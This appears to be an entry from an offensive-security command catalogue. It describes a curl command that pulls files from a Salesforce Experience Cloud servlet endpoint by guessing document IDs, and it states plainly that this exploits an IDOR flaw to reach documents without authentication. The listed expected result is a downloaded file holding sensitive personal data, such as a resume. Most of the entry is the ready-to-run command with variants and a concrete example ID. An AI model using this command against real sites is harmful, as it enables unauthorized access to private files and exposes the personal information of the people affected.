---
id: cmd-curl-download
data: >-
  curl -O
  https://[instance].experience.[domain]/sfsites/c/sfc/servlet.shepherd/document/download/[ID]
tags:
  - download
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows (with curl)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:43.129Z'
verified: false
validated: true
submitted: true
---
# curl-download

## Command

```bash
curl -O https://[instance].experience.[domain]/sfsites/c/sfc/servlet.shepherd/document/download/[ID]
```

## Description

Downloads a file from the Salesforce servlet endpoint using the provided ContentDocument ID, exploiting IDOR for unauthenticated access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-O` | Save output to a file named after the URL | Yes |
| `URL` | Full download URL with ID | Yes |

## Examples

### Basic Usage

```bash
curl -O https://example.experience.salesforce.com/sfsites/c/sfc/servlet.shepherd/document/download/069830000028KJdAAM
```

### Advanced Usage

```bash
curl -O -H "User-Agent: Mozilla/5.0" https://[instance]/sfsites/c/sfc/servlet.shepherd/document/download/[ID]
```

## Expected Output

Binary file downloaded (e.g., resume.pdf) containing sensitive PII; no authentication prompt if vulnerable.

## Related

- [[Related Procedure: Download-File-Using-IDOR]]
